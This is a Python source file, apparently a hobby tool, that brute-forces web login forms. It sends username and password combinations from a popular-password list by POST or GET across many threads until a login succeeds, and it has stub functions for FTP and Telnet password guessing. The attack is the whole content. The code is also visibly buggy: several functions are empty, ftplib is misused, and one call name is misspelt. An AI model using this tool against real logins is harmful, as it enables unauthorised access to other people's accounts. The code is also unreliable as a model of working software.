__author__ = 'Marcin'
import lib.core.weblib
import lib.techniques.allCombinations
import lib.techniques.intelligent
import lib.techniques.popular
import lib.techniques.wordlist
import lib.utils.PrintInfo
from time import sleep
from ftplib import FTP
import threading
threads=[]
gefunden = False
def attackBruteForce(Url,admurl,datas,Tech):
    Datas=datas
    for i in datas:
        global gefunden
        if(gefunden==False):
            if(Tech=="POST"):
                ret = lib.core.weblib.SendFromPOST(anmeldurl=Url,admurl=admurl,datas=i)
            elif(Tech=="GET"):
                ret = lib.core.weblib.SendFormGET(url=Url,datas=i)
            lib.utils.PrintInfo.printInfo(ret,i["user"],i["password"])
            if(ret):
                gefunden=True
                lib.utils.PrintInfo.printInfo("Login Successfull")
        else:None

def attackFTPBruteForce(victim,datas):
    for i in datas:
        None

def attackTelnetBruteForce(victim,user,datas):
    for i in datas:
        FTP.connect("victim")
        ret = FTP.login(user,i)
        if("230" in ret):break

def attackPOST(url,Datas):
    if(lib.core.weblib.SendFormPOST(url=url,datas=Datas)):
        return True

def attackGET(url,Datas):
    if(lib.core.weblib.SendFormGET(url=url,datas=Datas)):
        return True

def calculateAttackLenght(Credentials,Latenz):
    return int(int(Credentials)*int(Latenz))/60

#Hauptmethode
def attack(url,admlurl,user,uservariableName,passwordVariable,technique,tech,*opt):
    passwords = TECHS[technique]()
    datas = generateDatas(user,uservariableName,passwords,passwordVariable)
    idx = int(len(datas)/100)
    packs=[]
    for i in range(0,idx):
        packs.append(datas[i*100:(i+1)*100])
    input(str(len(packs))+" Deamons")
    for i in range(0,len(packs)):threads.append(threading.Thread(group=None,target=attackBruteForce,args=(url,admlurl,packs[i],tech,),kwargs={}))
    for i in threads:
        i.setDaemon(True)
        i.start()
        i.join()
    for w in threads:
        try:
            w.run()
        except Exception:None


def generateData(user,usernamevariable,password,passwordvariable):
    return {usernamevariable:user,passwordvariable:password[0]}

def generateDatas(user,usernamevariabke,PASSWORDS,passwordvariable):
    Datas = []
    for i in PASSWORDS:
        Datas.append(generateData(user,usernamevariabke,i,passwordvariable))
    return Datas

def attackwithAllcombinations():
    None

def attackwithIntelligence():
    None

def attackwithPopular():
    return lib.techniques.popular.PopularPassword()


def attackwithWordlist():
    None

TECHS=dict(popular=attackwithPopular,allcomb=attackwithAllcombinations)

#attack("http://127.0.0.1:8000/Anmelden","http://127.0.0.1:8000/QuizzAdmin","Test","user","password","popular","POST")